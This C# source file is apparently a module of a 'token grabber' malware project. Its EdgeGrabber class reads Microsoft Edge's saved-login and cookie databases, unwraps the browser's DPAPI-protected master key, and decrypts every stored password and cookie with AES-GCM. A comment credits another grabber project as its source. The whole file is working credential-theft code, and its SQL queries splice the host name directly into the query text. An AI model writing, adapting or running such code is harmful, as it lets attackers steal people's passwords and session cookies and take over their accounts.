using Newtonsoft.Json.Linq;
using Org.BouncyCastle.Crypto;
using Org.BouncyCastle.Crypto.Parameters;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;
using Org.BouncyCastle.Crypto.Modes;
using Org.BouncyCastle.Crypto.Engines;

//https://github.com/bytixo/CockyGrabber thx u saved me a lot <3.

namespace Qvoid_Token_Grabber.PasswordGrabbers
{
    class EdgeGrabber
    {
        public string EdgeBrowserCookiePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Edge\User Data\Default\Cookies";
        public string EdgeBrowserPasswordsPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Edge\User Data\Default\Login Data";
        public string EdgeKeyPath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Edge\User Data\Local State";

        /// <summary>
        /// Returns a value depending on if the File "Cookies" was found
        /// </summary>
        /// <returns>true if Cookies was found and false if not</returns>
        public bool CookiesExists()
        {
            if (File.Exists(EdgeBrowserCookiePath))
                return true;
            return false;
        }
        /// <summary>
        /// Returns a value depending on if the File "Local State" was found
        /// </summary>
        /// <returns>true if File was found and false if not</returns>
        public bool KeyExists()
        {
            if (File.Exists(EdgeKeyPath))
                return true;
            return false;
        }


        public List<Passwords> GetPasswordByHostname(string hostName, byte[] key)
        {
            List<Passwords> password = new List<Passwords>();
            if (hostName == null) throw new ArgumentNullException("hostName"); // throw ArgumentNullException if hostName is null
            if (!CookiesExists()) throw new FileNotFoundException("Cant find cookie store", EdgeBrowserPasswordsPath);  // throw FileNotFoundException if "Chrome\User Data\Default\Cookies" not found

            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={EdgeBrowserPasswordsPath};pooling=false"))
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = $"SELECT origin_url,username_value,password_value FROM logins WHERE origin_url = '{hostName}'";

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        password.Add(new Passwords()
                        {
                            url = reader.GetString(0),
                            password = DecryptWithKey((byte[])reader[2], key, 3),
                            username = reader.GetString(1)
                        });
                    }
                }
                conn.Close();
            }
            return password;
        }
        public List<Passwords> GetAllPasswords(byte[] key)
        {
            try
            {
                List<Passwords> password = new List<Passwords>();
                if (!PasswordsExists()) throw new FileNotFoundException("Cant find password store", EdgeBrowserPasswordsPath);  // throw FileNotFoundException if "Chrome\User Data\Default\Cookies" not found

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={EdgeBrowserPasswordsPath};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"SELECT origin_url,username_value,password_value FROM logins";

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            password.Add(new Passwords()
                            {
                                url = reader.GetString(0),
                                password = DecryptWithKey((byte[])reader[2], key, 3),
                                username = reader.GetString(1)
                            });
                        }
                    }
                    conn.Close();
                }
                return password;
            }
            catch { return null; }
        }



        /// <summary>
        /// Returns a value depending on if the File "Login Data" was found
        /// </summary>
        /// <returns>true if Cookies was found and false if not</returns>
        public bool PasswordsExists()
        {
            if (File.Exists(EdgeBrowserPasswordsPath))
                return true;
            return false;
        }


        public List<Cookie> GetCookiesByHostname(string hostName, byte[] key)
        {
            List<Cookie> cookies = new List<Cookie>();
            if (hostName == null) throw new ArgumentNullException("hostName"); // throw ArgumentNullException if hostName is null
            if (!CookiesExists()) throw new FileNotFoundException("Cant find cookie store", EdgeBrowserCookiePath);  // throw FileNotFoundException if "Chrome\User Data\Default\Cookies" not found

            using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={EdgeBrowserCookiePath};pooling=false"))
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = $"SELECT name,encrypted_value,host_key FROM cookies WHERE host_key = '{hostName}'";

                conn.Open();
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        cookies.Add(new Cookie()
                        {
                            Name = reader.GetString(0),
                            Value = DecryptWithKey((byte[])reader[1], key, 3),
                            HostName = reader.GetString(2)
                        });
                    }
                }
                conn.Close();
            }
            return cookies;
        }
        public List<Cookie> GetAllCookies(byte[] key)
        {
            try
            {
                List<Cookie> cookies = new List<Cookie>();
                if (!CookiesExists()) throw new FileNotFoundException("Cant find cookie store", EdgeBrowserCookiePath);  // throw FileNotFoundException if "Chrome\User Data\Default\Cookies" not found

                using (var conn = new System.Data.SQLite.SQLiteConnection($"Data Source={EdgeBrowserCookiePath};pooling=false"))
                using (var cmd = conn.CreateCommand())
                {
                    cmd.CommandText = $"SELECT name,encrypted_value,host_key FROM cookies";

                    conn.Open();
                    using (var reader = cmd.ExecuteReader())
                    {
                        while (reader.Read())
                        {
                            cookies.Add(new Cookie()
                            {
                                Name = reader.GetString(0),
                                Value = DecryptWithKey((byte[])reader[1], key, 3),
                                HostName = reader.GetString(2)
                            });
                        }
                    }
                    conn.Close();
                }
                return cookies;
            }
            catch { return null; }
        }


        /// <summary>
        /// Gets the key to decrypt a DB Value
        /// </summary>
        /// <returns>Key to decrypt DB Value</returns>
        public byte[] GetKey()
        {
            string encKey = File.ReadAllText(EdgeKeyPath); // reads the file (string)
            encKey = JObject.Parse(encKey)["os_crypt"]["encrypted_key"].ToString(); // parses the string
            return ProtectedData.Unprotect(Convert.FromBase64String(encKey).Skip(5).ToArray(), null, DataProtectionScope.LocalMachine); // decrypts the key and returns a byte Array
        }

        private string DecryptWithKey(byte[] msg, byte[] key, int nonSecretPayloadLength)
        {
            const int KEY_BIT_SIZE = 256;
            const int MAC_BIT_SIZE = 128;
            const int NONCE_BIT_SIZE = 96;

            if (key == null || key.Length != KEY_BIT_SIZE / 8)
                throw new ArgumentException($"Key needs to be {KEY_BIT_SIZE} bit!", "key");
            if (msg == null || msg.Length == 0)
                throw new ArgumentException("Message required!", "message");

            using (var cipherStream = new MemoryStream(msg))
            using (var cipherReader = new BinaryReader(cipherStream))
            {
                var nonSecretPayload = cipherReader.ReadBytes(nonSecretPayloadLength);
                var nonce = cipherReader.ReadBytes(NONCE_BIT_SIZE / 8);
                var cipher = new GcmBlockCipher(new AesEngine());
                var parameters = new AeadParameters(new KeyParameter(key), MAC_BIT_SIZE, nonce);
                cipher.Init(false, parameters);
                var cipherText = cipherReader.ReadBytes(msg.Length);
                var plainText = new byte[cipher.GetOutputSize(cipherText.Length)];
                try
                {
                    var len = cipher.ProcessBytes(cipherText, 0, cipherText.Length, plainText, 0);
                    cipher.DoFinal(plainText, len);
                }
                catch (InvalidCipherTextException)
                {
                    return null;
                }
                return Encoding.Default.GetString(plainText);
            }
        }
    }
}
